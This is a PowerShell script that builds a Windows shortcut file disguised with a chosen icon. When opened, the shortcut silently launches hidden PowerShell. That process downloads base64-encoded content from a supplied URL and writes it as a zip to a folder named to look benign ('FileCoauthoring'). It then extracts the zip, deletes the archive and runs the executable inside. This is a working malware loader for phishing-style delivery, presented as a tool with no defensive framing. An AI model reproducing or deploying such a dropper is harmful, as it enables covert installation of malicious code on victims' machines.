param (
    [string]$url,
    [string]$zipName,
    [string]$exeName,
    [string]$lnkPath,
    [string]$iconPath
)

$scriptContent = @"
$response = Invoke-WebRequest -Uri '$url' -UseBasicParsing; 
$base64Content = \$response.Content; 
\$bytes = [Convert]::FromBase64String(\$base64Content); 
function Test-Admin { 
    \$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent(); 
    \$principal = New-Object Security.Principal.WindowsPrincipal(\$currentUser); 
    return \$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) 
}; 
\$directoryPath = if (Test-Admin) { 'C:\Program Files\FileCoauthoring' } else { '\$env:LOCALAPPDATA\FileCoauthoring' }; 
\$zipFileName = '\$directoryPath\$zipName'; 
Write-Output \$zipFileName; 
if (-not (Test-Path \$directoryPath)) { 
    New-Item -ItemType Directory -Path \$directoryPath -Force 
}; 
[System.IO.File]::WriteAllBytes('\$zipFileName', \$bytes); 
Expand-Archive -LiteralPath '\$zipFileName' -DestinationPath \$pwd -Force; 
Remove-Item -Path '\$zipFileName'; 
Start-Process -FilePath '\$pwd\$exeName'
"@

# Create the shortcut
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($lnkPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-NoLogo -NoProfile -WindowStyle Hidden -Command `"& { $scriptContent }`""
$shortcut.WorkingDirectory = $null
$shortcut.WindowStyle = 7  # Hidden

if ($iconPath) {
    $shortcut.IconLocation = $iconPath
}

$shortcut.Save()
